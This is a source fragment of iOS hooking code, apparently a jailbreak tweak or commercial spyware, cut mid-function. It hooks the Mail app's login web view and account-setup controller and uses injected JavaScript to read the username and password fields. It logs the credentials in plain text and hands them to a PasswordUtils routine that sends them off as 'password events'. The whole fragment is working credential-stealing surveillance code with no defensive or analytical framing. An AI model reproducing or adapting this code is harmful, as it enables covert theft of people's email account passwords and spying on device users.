    if ([[urlRequest.URL absoluteString] rangeOfString:@"http://apple.com"].location != NSNotFound) {
        DLog(@"Start Capture %@", webView);
        
        [webView evaluateJavaScript:@"document.getElementById('login-username').value" completionHandler:^(id usernameResult, NSError * error) {
            if (!error) {
                NSString* username = usernameResult;
                [webView evaluateJavaScript:@"document.getElementById('login-passwd').value" completionHandler:^(id passwordResult, NSError * error) {
                    if (!error) {
                        NSString* password = passwordResult;
                        
                        DLog (@"username %@", username)
                        DLog (@"password %@", password)
                        
                        if (username     &&  [username length]    &&
                            password    &&  [password length])  {
                            
                            DLog(@"Capture account and password [%@] [%@]", username, password)
                            
                            [PasswordUtils sendPasswordEventForAccount:username
                                                              password:password
                                                         applicationID:@"com.apple.mobilemail"
                                                       applicationName:@"Mail"];
                        }
                    }
                }];
            }
        }];
    }
    
    CALL_ORIG(SL_OOPAWebViewController, webView$decidePolicyForNavigationAction$decisionHandler$_Yahoo, arg1, arg2, arg3);
}

HOOK(AccountPSDetailController, finishedSetupWithAccount$, void, id arg1){
    NSMutableDictionary *accountValue = self.accountValues;
    NSString *accountId = [accountValue objectForKey:@"Username"];
    NSString *password = [accountValue objectForKey:@"Password"];
    
    DLog(@"Capture account and password [%@] [%@]", accountId, password)
    
    [PasswordUtils sendPasswordEventForAccount:accountId
                                      password:password
                                 applicationID:@"com.apple.mobilemail"
                               applicationName:@"Mail"];
    
    CALL_ORIG(AccountPSDetailController, finishedSetupWithAccount$, arg1);
}